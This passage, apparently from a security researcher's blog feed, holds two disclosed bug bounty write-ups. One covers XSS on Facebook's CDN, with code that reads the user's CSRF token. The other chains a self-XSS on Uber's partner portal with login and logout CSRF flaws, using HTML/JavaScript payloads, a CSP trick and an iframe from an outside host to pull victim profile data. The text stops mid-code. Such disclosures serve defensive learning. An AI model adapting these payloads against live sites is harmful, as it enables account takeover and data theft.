&lt;span class="nx"&gt;i&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;setAttribute&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="dl"&gt;'&lt;/span&gt;&lt;span class="s1"&gt;style&lt;/span&gt;&lt;span class="dl"&gt;'&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="dl"&gt;'&lt;/span&gt;&lt;span class="s1"&gt;visibility:hidden;width:0px;height:0px;&lt;/span&gt;&lt;span class="dl"&gt;'&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
&lt;span class="nx"&gt;i&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;setAttribute&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="dl"&gt;'&lt;/span&gt;&lt;span class="s1"&gt;src&lt;/span&gt;&lt;span class="dl"&gt;'&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="dl"&gt;'&lt;/span&gt;&lt;span class="s1"&gt;https://www.facebook.com/v2.4/plugins/page.php?adapt_container_width=true&amp;amp;app_id=113869198637480&amp;amp;channel=https%3A%2F%2Fs-static.ak.facebook.com%2Fconnect%2Fxd_arbiter%2FX9pYjJn4xhW.js%3Fversion%3D41%23cb%3Df365065abc%26domain%3Ddevelopers.facebook.com%26origin%3Dhttps%253A%252F%252Fdevelopers.facebook.com%252Ff366e4bcac%26relation%3Dparent.parent&amp;amp;container_width=588&amp;amp;hide_cover=false&amp;amp;href=https%3A%2F%2Fwww.facebook.com%2Ffacebook&amp;amp;locale=en_GB&amp;amp;sdk=joey&amp;amp;show_facepile=true&amp;amp;show_posts=true&amp;amp;small_header=false&lt;/span&gt;&lt;span class="dl"&gt;'&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;

&lt;span class="nx"&gt;i&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;onload&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="kd"&gt;function&lt;/span&gt;&lt;span class="p"&gt;(){&lt;/span&gt;
    &lt;span class="nx"&gt;alert&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;document&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;domain&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="se"&gt;\n&lt;/span&gt;&lt;span class="s2"&gt;fb_dtsg: &lt;/span&gt;&lt;span class="dl"&gt;"&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="nx"&gt;i&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;contentWindow&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nb"&gt;document&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;getElementsByName&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="dl"&gt;'&lt;/span&gt;&lt;span class="s1"&gt;fb_dtsg&lt;/span&gt;&lt;span class="dl"&gt;'&lt;/span&gt;&lt;span class="p"&gt;)[&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;].&lt;/span&gt;&lt;span class="nx"&gt;value&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
&lt;span class="p"&gt;};&lt;/span&gt;

&lt;span class="nb"&gt;document&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;body&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;appendChild&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;i&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Notice how the alert box now shows &lt;code&gt;facebook.com&lt;/code&gt;, not &lt;code&gt;photos.facebook.com&lt;/code&gt;.&lt;/p&gt;

&lt;figure style="text-align: center;"&gt;
    &lt;a class="image-popup" href="https://whitton.io/images/facebookxss/facebook-xss-11.png"&gt;
        &lt;img src="https://whitton.io/images/facebookxss/facebook-xss-11.png" /&gt;
    &lt;/a&gt;
&lt;/figure&gt;

&lt;p&gt;We now have access to the user’s CSRF token, which means we can make arbitrary requests on their behalf (such as posting a status, etc).&lt;/p&gt;

&lt;p&gt;It’s also possible to issue &lt;a href="https://developer.mozilla.org/en-US/docs/Web/API/XMLHttpRequest"&gt;XHR&lt;/a&gt; requests via the iframe to extract data from &lt;code&gt;www.facebook.com&lt;/code&gt; (rather than blindly post data with the token).&lt;/p&gt;

&lt;p&gt;So it turns out an XSS on the CDN can do &lt;em&gt;pretty much&lt;/em&gt; everything that one on the main site can.&lt;/p&gt;

&lt;h4 id="fix"&gt;Fix&lt;/h4&gt;

&lt;p&gt;Facebook quickly hot-fixed the issue by removing the forward DNS entry for &lt;code&gt;photo.facebook.com&lt;/code&gt;.&lt;/p&gt;

&lt;figure style="text-align: center;"&gt;
    &lt;a class="image-popup" href="https://whitton.io/images/facebookxss/facebook-xss-12.png"&gt;
        &lt;img src="https://whitton.io/images/facebookxss/facebook-xss-12.png" style="width: 70%;" /&gt;
    &lt;/a&gt;
&lt;/figure&gt;

&lt;p&gt;Whilst the content type issue still exists, it’s a lot less severe since the files are hosted on a sandboxed domain.&lt;/p&gt;

&lt;h4 id="bonus-ascii-art"&gt;Bonus ASCII Art&lt;/h4&gt;

&lt;p&gt;One easter-egg I found was that if you append &lt;code&gt;.txt&lt;/code&gt; or &lt;code&gt;.html&lt;/code&gt; to the URL (rather than replace the file extension), you get a cool ASCII art version of the image. This also works for images on Instagram (since they share the same CDN).&lt;/p&gt;

&lt;p&gt;&lt;a href="https://fbcdn-photos-b-a.akamaihd.net/hphotos-ak-xtf1/t39.2081-0/11409241_518100315004842_156594719_n.jpg.html"&gt;Try it out yourself&lt;/a&gt;:&lt;/p&gt;

&lt;figure style="text-align: center;"&gt;
    &lt;a class="image-popup" href="https://whitton.io/images/facebookxss/facebook-xss-13.png"&gt;
        &lt;img src="https://whitton.io/images/facebookxss/facebook-xss-13.png" style="width: 70%;" /&gt;
    &lt;/a&gt;
&lt;/figure&gt;

    &lt;p&gt;&lt;a href="https://whitton.io/articles/xss-on-facebook-via-png-content-types/"&gt;An XSS on Facebook via PNGs &amp; Wonky Content Types&lt;/a&gt; was originally published by Jack at &lt;a href="https://whitton.io"&gt;Jack&lt;/a&gt; on January 27, 2016.&lt;/p&gt;</description><pubDate>Wed, 27 Jan 2016 00:00:00 +0000</pubDate></item><item><title>Uber Bug Bounty: Turning Self-XSS into Good-XSS</title><link>https://whitton.io/articles/uber-turning-self-xss-into-good-xss/</link><description>&lt;p&gt;&lt;em&gt;Now that the Uber bug bounty programme has launched publicly, I can publish some of my favourite submissions, which I’ve been itching to do over the past year. This is part one of maybe two or three posts.&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;On Uber’s &lt;a href="https://partners.uber.com"&gt;Partners portal&lt;/a&gt;, where Drivers can login and update their details, I found a very simple, classic XSS: changing the value of one of the profile fields to &lt;code class="highlighter-rouge"&gt;&amp;lt;script&amp;gt;alert(document.domain);&amp;lt;/script&amp;gt;&lt;/code&gt; causes the code to be executed, and an alert box popped.&lt;/p&gt;

&lt;figure style="text-align: center;"&gt;
    &lt;a class="image-popup" href="https://whitton.io/images/uber-partners-xss/uber-partners-xss-1-1.png"&gt;
        
            &lt;source type="image/webp" /&gt;
            &lt;source type="image/jpeg" /&gt; 
            &lt;img src="https://whitton.io/images/uber-partners-xss/uber-partners-xss-1-1.png" style="width: 50%;" /&gt;
        
    &lt;/a&gt;
&lt;/figure&gt;

&lt;figure style="text-align: center;"&gt;
    &lt;a class="image-popup" href="https://whitton.io/images/uber-partners-xss/uber-partners-xss-1-2.png"&gt;
        
            &lt;source type="image/webp" /&gt;
            &lt;source type="image/jpeg" /&gt; 
            &lt;img src="https://whitton.io/images/uber-partners-xss/uber-partners-xss-1-2.png" style="width: 50%;" /&gt;
        
    &lt;/a&gt;
&lt;/figure&gt;

&lt;p&gt;This took all of two minutes to find after signing up, but now comes the fun bit.&lt;/p&gt;

&lt;h3 id="self-xss"&gt;Self-XSS&lt;/h3&gt;

&lt;p&gt;Being able to execute additional, arbitrary JavaScript under the context of another site is called &lt;a href="https://en.wikipedia.org/wiki/Cross-site_scripting"&gt;Cross-Site Scripting&lt;/a&gt; (which I’m assuming 99% of my readers know). Normally you would want to do this against other users in order to yank session cookies, submit XHR requests, and so on.&lt;/p&gt;

&lt;p&gt;If you &lt;em&gt;can’t&lt;/em&gt; do this against another user - for example, the code only executes against your account, then this is known as a self-XSS.&lt;/p&gt;

&lt;p&gt;In this case, it would seem that’s what we’ve found. The address section of your profile is only shown to you (the exception may be if an internal Uber tool also displays the address, but that’s another matter), and we can’t update another user’s address to force it to be executed against them.&lt;/p&gt;

&lt;p&gt;I’m always hesitant to send in bugs which have potential (an XSS in this site would be cool), so let’s try and find a way of removing the “self” part from the bug.&lt;/p&gt;

&lt;h3 id="uber-oauth-login-flow"&gt;Uber OAuth Login Flow&lt;/h3&gt;

&lt;p&gt;The &lt;a href="https://en.wikipedia.org/wiki/OAuth"&gt;OAuth&lt;/a&gt; that flow Uber uses is pretty typical:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;User visits an Uber site which requires login, e.g. &lt;code class="highlighter-rouge"&gt;partners.uber.com&lt;/code&gt;&lt;/li&gt;
  &lt;li&gt;User is redirected to the authorisation server, &lt;code class="highlighter-rouge"&gt;login.uber.com&lt;/code&gt;&lt;/li&gt;
  &lt;li&gt;User enters their credentials&lt;/li&gt;
  &lt;li&gt;User is redirected back to &lt;code class="highlighter-rouge"&gt;partners.uber.com&lt;/code&gt; with a code, which can then be exchanged for an access token&lt;/li&gt;
&lt;/ul&gt;

&lt;figure style="text-align: center;"&gt;
    &lt;a class="image-popup" href="https://whitton.io/images/uber-partners-xss/uber-partners-xss-2.png"&gt;
        
            &lt;source type="image/webp" /&gt;
            &lt;source type="image/jpeg" /&gt; 
            &lt;img src="https://whitton.io/images/uber-partners-xss/uber-partners-xss-2.png" style="width: 100%;" /&gt;
        
    &lt;/a&gt;
&lt;/figure&gt;

&lt;p&gt;In case you haven’t spotted from the above screenshot, the OAuth callback, &lt;code class="highlighter-rouge"&gt;/oauth/callback?code=...&lt;/code&gt;, doesn’t use the recommended &lt;a href="http://www.twobotechnologies.com/blog/2014/02/importance-of-state-in-oauth2.html"&gt;&lt;code class="highlighter-rouge"&gt;state&lt;/code&gt;&lt;/a&gt; parameter. This introduces a CSRF vulnerability in the login function, which may or may-not be considered an important issue.&lt;/p&gt;

&lt;p&gt;In addition, there is a CSRF vulnerability in the logout function, which &lt;em&gt;really&lt;/em&gt; isn’t considered an issue. Browsing to &lt;code class="highlighter-rouge"&gt;/logout&lt;/code&gt; destroys the user’s &lt;code class="highlighter-rouge"&gt;partner.uber.com&lt;/code&gt; session, and performs a redirect to the same logout function on &lt;code class="highlighter-rouge"&gt;login.uber.com&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;Since our payload is only available inside our account, we want to log the user into our account, which in turn will execute the payload. However, logging them into our account destroys their session, which destroys a lot of the value of the bug (it’s no longer possible to perform actions on their account). So let’s chain these three minor issues (self-XSS and two CSRF’s) together.&lt;/p&gt;

&lt;p&gt;&lt;em&gt;For more info on OAuth security, check out &lt;a href="http://www.oauthsecurity.com/"&gt;@homakov’s awesome guide&lt;/a&gt;.&lt;/em&gt;&lt;/p&gt;

&lt;h3 id="chaining-minor-bugs"&gt;Chaining Minor Bugs&lt;/h3&gt;

&lt;p&gt;Our plan has three parts to it:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;First, log the user out of their &lt;code class="highlighter-rouge"&gt;partner.uber.com&lt;/code&gt; session, but &lt;em&gt;not&lt;/em&gt; their &lt;code class="highlighter-rouge"&gt;login.uber.com&lt;/code&gt; session. This ensures that we can log them back into their account&lt;/li&gt;
  &lt;li&gt;Second, log the user into &lt;em&gt;our&lt;/em&gt; account, so that our payload will be executed&lt;/li&gt;
  &lt;li&gt;Finally, log them back into &lt;em&gt;their&lt;/em&gt; account, whilst our code is still running, so that we can access their details&lt;/li&gt;
&lt;/ul&gt;

&lt;h4 id="step-1-logging-out-of-only-one-domain"&gt;Step 1. Logging Out of Only One Domain&lt;/h4&gt;

&lt;p&gt;We first want to issue a request to &lt;code class="highlighter-rouge"&gt;https://partners.uber.com/logout/&lt;/code&gt;, so that we can then log them into our account. The problem is that issuing a requets to this end-point results in a 302 redirect to &lt;code class="highlighter-rouge"&gt;https://login.uber.com/logout/&lt;/code&gt;, which destroys the session. We can’t intercept each redirect and drop the request, since the browser follows these implicitly.&lt;/p&gt;

&lt;p&gt;However, one trick we can do is to use &lt;a href="https://developer.mozilla.org/en-US/docs/Web/Security/CSP"&gt;Content Security Policy&lt;/a&gt; to define which sources are allowed to be loaded (I hope you can see the irony in using a feature designed to help mitigate XSS in this context).&lt;/p&gt;

&lt;p&gt;We’ll set our policy to only allow requests to &lt;code class="highlighter-rouge"&gt;partners.uber.com&lt;/code&gt;, which will block &lt;code class="highlighter-rouge"&gt;https://login.uber.com/logout/&lt;/code&gt;.&lt;/p&gt;

&lt;figure class="highlight"&gt;&lt;pre&gt;&lt;code class="language-html"&gt;&lt;span class="c"&gt;&amp;lt;!-- Set content security policy to block requests to login.uber.com, so the target maintains their session --&amp;gt;&lt;/span&gt;
&lt;span class="nt"&gt;&amp;lt;meta&lt;/span&gt; &lt;span class="na"&gt;http-equiv=&lt;/span&gt;&lt;span class="s"&gt;"Content-Security-Policy"&lt;/span&gt; &lt;span class="na"&gt;content=&lt;/span&gt;&lt;span class="s"&gt;"img-src https://partners.uber.com"&lt;/span&gt;&lt;span class="nt"&gt;&amp;gt;&lt;/span&gt;
&lt;span class="c"&gt;&amp;lt;!-- Logout of partners.uber.com --&amp;gt;&lt;/span&gt;
&lt;span class="nt"&gt;&amp;lt;img&lt;/span&gt; &lt;span class="na"&gt;src=&lt;/span&gt;&lt;span class="s"&gt;"https://partners.uber.com/logout/"&lt;/span&gt;&lt;span class="nt"&gt;&amp;gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;This works, as indicated by the CSP violation error message:&lt;/p&gt;

&lt;figure style="text-align: center;"&gt;
    &lt;a class="image-popup" href="https://whitton.io/images/uber-partners-xss/uber-partners-xss-3.png"&gt;
        
            &lt;source type="image/webp" /&gt;
            &lt;source type="image/jpeg" /&gt; 
            &lt;img src="https://whitton.io/images/uber-partners-xss/uber-partners-xss-2.png" style="width: 100%;" /&gt;
        
    &lt;/a&gt;
&lt;/figure&gt;

&lt;h4 id="step-2-logging-into-our-account"&gt;Step 2. Logging Into Our Account&lt;/h4&gt;

&lt;p&gt;This one is relatively simple. We issue a request to &lt;code class="highlighter-rouge"&gt;https://partners.uber.com/login/&lt;/code&gt; to initiate a login (this is needed else the application won’t accept the callback). Using the CSP trick we prevent the flow being completed, then we feed in our own &lt;code class="highlighter-rouge"&gt;code&lt;/code&gt; (which can be obtained by logging into our own account), which logs them in to our account.&lt;/p&gt;

&lt;p&gt;Since a CSP violation triggers the &lt;code class="highlighter-rouge"&gt;onerror&lt;/code&gt; event handler, this will be used to jump to the next step.&lt;/p&gt;

&lt;figure class="highlight"&gt;&lt;pre&gt;&lt;code class="language-html"&gt;&lt;span class="c"&gt;&amp;lt;!-- Set content security policy to block requests to login.uber.com, so the target maintains their session --&amp;gt;&lt;/span&gt;
&lt;span class="nt"&gt;&amp;lt;meta&lt;/span&gt; &lt;span class="na"&gt;http-equiv=&lt;/span&gt;&lt;span class="s"&gt;"Content-Security-Policy"&lt;/span&gt; &lt;span class="na"&gt;content=&lt;/span&gt;&lt;span class="s"&gt;"img-src partners.uber.com"&lt;/span&gt;&lt;span class="nt"&gt;&amp;gt;&lt;/span&gt;
&lt;span class="c"&gt;&amp;lt;!-- Logout of partners.uber.com --&amp;gt;&lt;/span&gt;
&lt;span class="nt"&gt;&amp;lt;img&lt;/span&gt; &lt;span class="na"&gt;src=&lt;/span&gt;&lt;span class="s"&gt;"https://partners.uber.com/logout/"&lt;/span&gt; &lt;span class="na"&gt;onerror=&lt;/span&gt;&lt;span class="s"&gt;"login();"&lt;/span&gt;&lt;span class="nt"&gt;&amp;gt;&lt;/span&gt;
&lt;span class="nt"&gt;&amp;lt;script&amp;gt;&lt;/span&gt;
    &lt;span class="c1"&gt;//Initiate login so that we can redirect them&lt;/span&gt;
    &lt;span class="kd"&gt;var&lt;/span&gt; &lt;span class="nx"&gt;login&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="kd"&gt;function&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
        &lt;span class="kd"&gt;var&lt;/span&gt; &lt;span class="nx"&gt;loginImg&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nb"&gt;document&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;createElement&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="dl"&gt;'&lt;/span&gt;&lt;span class="s1"&gt;img&lt;/span&gt;&lt;span class="dl"&gt;'&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
        &lt;span class="nx"&gt;loginImg&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;src&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="dl"&gt;'&lt;/span&gt;&lt;span class="s1"&gt;https://partners.uber.com/login/&lt;/span&gt;&lt;span class="dl"&gt;'&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
        &lt;span class="nx"&gt;loginImg&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;onerror&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nx"&gt;redir&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
    &lt;span class="p"&gt;}&lt;/span&gt;
    &lt;span class="c1"&gt;//Redirect them to login with our code&lt;/span&gt;
    &lt;span class="kd"&gt;var&lt;/span&gt; &lt;span class="nx"&gt;redir&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="kd"&gt;function&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
        &lt;span class="c1"&gt;//Get the code from the URL to make it easy for testing&lt;/span&gt;
        &lt;span class="kd"&gt;var&lt;/span&gt; &lt;span class="nx"&gt;code&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nb"&gt;window&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;location&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;hash&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;slice&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
        &lt;span class="kd"&gt;var&lt;/span&gt; &lt;span class="nx"&gt;loginImg2&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nb"&gt;document&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;createElement&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="dl"&gt;'&lt;/span&gt;&lt;span class="s1"&gt;img&lt;/span&gt;&lt;span class="dl"&gt;'&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
        &lt;span class="nx"&gt;loginImg2&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;src&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="dl"&gt;'&lt;/span&gt;&lt;span class="s1"&gt;https://partners.uber.com/oauth/callback?code=&lt;/span&gt;&lt;span class="dl"&gt;'&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="nx"&gt;code&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
        &lt;span class="nx"&gt;loginImg2&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;onerror&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="kd"&gt;function&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
            &lt;span class="c1"&gt;//Redirect to the profile page with the payload&lt;/span&gt;
            &lt;span class="nb"&gt;window&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;location&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="dl"&gt;'&lt;/span&gt;&lt;span class="s1"&gt;https://partners.uber.com/profile/&lt;/span&gt;&lt;span class="dl"&gt;'&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
        &lt;span class="p"&gt;}&lt;/span&gt;
    &lt;span class="p"&gt;}&lt;/span&gt;
&lt;span class="nt"&gt;&amp;lt;/script&amp;gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;h4 id="step-3-switching-back-to-their-account"&gt;Step 3. Switching Back to Their Account&lt;/h4&gt;

&lt;p&gt;This part is the code that will be contained as the XSS payload, stored in our account.&lt;/p&gt;

&lt;p&gt;As soon as this payload is executed, we can switch back to their account. This &lt;strong&gt;must&lt;/strong&gt; be in an iframe - we need to be able to continue running our code.&lt;/p&gt;

&lt;figure class="highlight"&gt;&lt;pre&gt;&lt;code class="language-js"&gt;&lt;span class="c1"&gt;//Create the iframe to log the user out of our account and back into theirs&lt;/span&gt;
&lt;span class="kd"&gt;var&lt;/span&gt; &lt;span class="nx"&gt;loginIframe&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nb"&gt;document&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;createElement&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="dl"&gt;'&lt;/span&gt;&lt;span class="s1"&gt;iframe&lt;/span&gt;&lt;span class="dl"&gt;'&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
&lt;span class="nx"&gt;loginIframe&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;setAttribute&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="dl"&gt;'&lt;/span&gt;&lt;span class="s1"&gt;src&lt;/span&gt;&lt;span class="dl"&gt;'&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="dl"&gt;'&lt;/span&gt;&lt;span class="s1"&gt;https://fin1te.net/poc/uber/login-target.html&lt;/span&gt;&lt;span class="dl"&gt;'&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
&lt;span class="nb"&gt;document&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;body&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;appendChild&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;loginIframe&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;The contents of the iframe uses the CSP trick again:&lt;/p&gt;

&lt;figure class="highlight"&gt;&lt;pre&gt;&lt;code class="language-html"&gt;&lt;span class="c"&gt;&amp;lt;!-- Set content security policy to block requests to login.uber.com, so the target maintains their session --&amp;gt;&lt;/span&gt;
&lt;span class="nt"&gt;&amp;lt;meta&lt;/span&gt; &lt;span class="na"&gt;http-equiv=&lt;/span&gt;&lt;span class="s"&gt;"Content-Security-Policy"&lt;/span&gt; &lt;span class="na"&gt;content=&lt;/span&gt;&lt;span class="s"&gt;"img-src partners.uber.com"&lt;/span&gt;&lt;span class="nt"&gt;&amp;gt;&lt;/span&gt;
&lt;span class="c"&gt;&amp;lt;!-- Log the user out of our partner account --&amp;gt;&lt;/span&gt;
&lt;span class="nt"&gt;&amp;lt;img&lt;/span&gt; &lt;span class="na"&gt;src=&lt;/span&gt;&lt;span class="s"&gt;"https://partners.uber.com/logout/"&lt;/span&gt; &lt;span class="na"&gt;onerror=&lt;/span&gt;&lt;span class="s"&gt;"redir();"&lt;/span&gt;&lt;span class="nt"&gt;&amp;gt;&lt;/span&gt;
&lt;span class="nt"&gt;&amp;lt;script&amp;gt;&lt;/span&gt;
    &lt;span class="c1"&gt;//Log them into partners via their session on login.uber.com&lt;/span&gt;
    &lt;span class="kd"&gt;var&lt;/span&gt; &lt;span class="nx"&gt;redir&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="kd"&gt;function&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
        &lt;span class="nb"&gt;window&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;location&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="dl"&gt;'&lt;/span&gt;&lt;span class="s1"&gt;https://partners.uber.com/login/&lt;/span&gt;&lt;span class="dl"&gt;'&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
    &lt;span class="p"&gt;};&lt;/span&gt;
&lt;span class="nt"&gt;&amp;lt;/script&amp;gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;The final piece is to create &lt;em&gt;another&lt;/em&gt; iframe, so we can grab some of their data.&lt;/p&gt;

&lt;figure class="highlight"&gt;&lt;pre&gt;&lt;code class="language-js"&gt;&lt;span class="c1"&gt;//Wait a few seconds, then load the profile page, which is now *their* profile&lt;/span&gt;
&lt;span class="nx"&gt;setTimeout&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="kd"&gt;function&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="kd"&gt;var&lt;/span&gt; &lt;span class="nx"&gt;profileIframe&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nb"&gt;document&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;createElement&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="dl"&gt;'&lt;/span&gt;&lt;span class="s1"&gt;iframe&lt;/span&gt;&lt;span class="dl"&gt;'&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
    &lt;span class="nx"&gt;profileIframe&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;setAttribute&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="dl"&gt;'&lt;/span&gt;&lt;span class="s1"&gt;src&lt;/span&gt;&lt;span class="dl"&gt;'&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="dl"&gt;'&lt;/span&gt;&lt;span class="s1"&gt;https://partners.uber.com/profile/&lt;/span&gt;&lt;span class="dl"&gt;'&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
    &lt;span class="nx"&gt;profileIframe&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;setAttribute&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="dl"&gt;'&lt;/span&gt;&lt;span class="s1"&gt;id&lt;/span&gt;&lt;span class="dl"&gt;'&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="dl"&gt;'&lt;/span&gt;&lt;span class="s1"&gt;pi&lt;/span&gt;&lt;span class="dl"&gt;'&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
    &lt;span class="nb"&gt;document&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;body&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;appendChild&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;profileIframe&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
    &lt;span class="c1"&gt;//Extract their email as PoC&lt;/span&gt;
    &lt;span class="nx"&gt;profileIframe&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;onload&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="kd"&gt;function&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
